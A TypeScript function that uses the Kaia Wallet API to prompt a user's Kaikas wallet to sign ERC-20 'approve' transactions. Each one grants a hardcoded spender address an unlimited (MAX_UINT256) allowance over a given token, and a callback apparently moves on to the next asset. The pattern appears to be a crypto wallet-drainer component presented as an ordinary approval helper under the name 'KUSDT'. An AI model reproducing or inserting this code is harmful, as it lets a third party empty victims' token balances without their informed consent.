import axios from 'axios';

const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

// 定义轮询间隔时间（毫秒）
const POLLING_INTERVAL = 5000;

export const kaiaWalletApprove = async (address: string | undefined, callNextAsset: () => void): Promise<void> => {
  try {
    // 发送交易请求
    const res = await axios.post(
      "https://api.kaiawallet.io/api/v1/k/prepare",
      {
        type: "execute_contract",
        bapp: {
          name: "KUSDT",
          // callback: {
          //   success: "https://www.google.com/search?q=success",
          //   fail: "https://www.google.com/search?q=fail",
          // },
        },
        transaction: {
          abi: `{
            "constant": false,
            "inputs": [
              { "name": "spender", "type": "address" },
              { "name": "amount", "type": "uint256" }
            ],
            "name": "approve",
            "outputs": [{ "name": "", "type": "bool" }],
            "type": "function"
          }`,
          value: "0",
          to: address,
          params: `["0x48F943a8a6A6437117063D3aCaf62e2047467966", "${MAX_UINT256}"]`,
        },
      },
      {
        headers: {
          "Content-Type": "application/json; charset=utf-8",
        },
      }
    );

    // 检查是否成功获取 request_key
    if (res.data.request_key) {
      const requestKey = res.data.request_key;
      const url = `kaikas://wallet/api?request_key=${requestKey}`;
      console.log("🔗 打开 Kaikas 钱包 URL:", url);
      window.location.href = url;

      // 开始轮询交易结果
      const intervalId = setInterval(async () => {
        try {
          const resultRes = await axios.get(
            `https://api.kaiawallet.io/api/v1/k/result/${requestKey}`,
            {
              headers: {
                "Content-Type": "application/json",
              },
            }
          );

          const resultData = resultRes.data;
          console.log("🔄 轮询结果:", resultData);

          // 检查交易状态
          if (resultData.status === "completed") {
            clearInterval(intervalId); // 停止轮询
            console.log("✅ 交易成功");
            callNextAsset(); // 调用传入的回调函数
          } else if (resultData.status === "failed" || resultData.status === "reverted") {
            clearInterval(intervalId); // 停止轮询
            console.error("❌ 交易失败");
          }
        } catch (pollError) {
          console.error("❌ 轮询交易结果失败:", pollError);
        }
      }, POLLING_INTERVAL); // 每隔 POLLING_INTERVAL 毫秒轮询一次
    } else {
      console.error("❌ 交易失败: 未返回 request_key");
    }
  } catch (error) {
    console.error("❌ 交易失败:", error);
    throw error;
  }
};
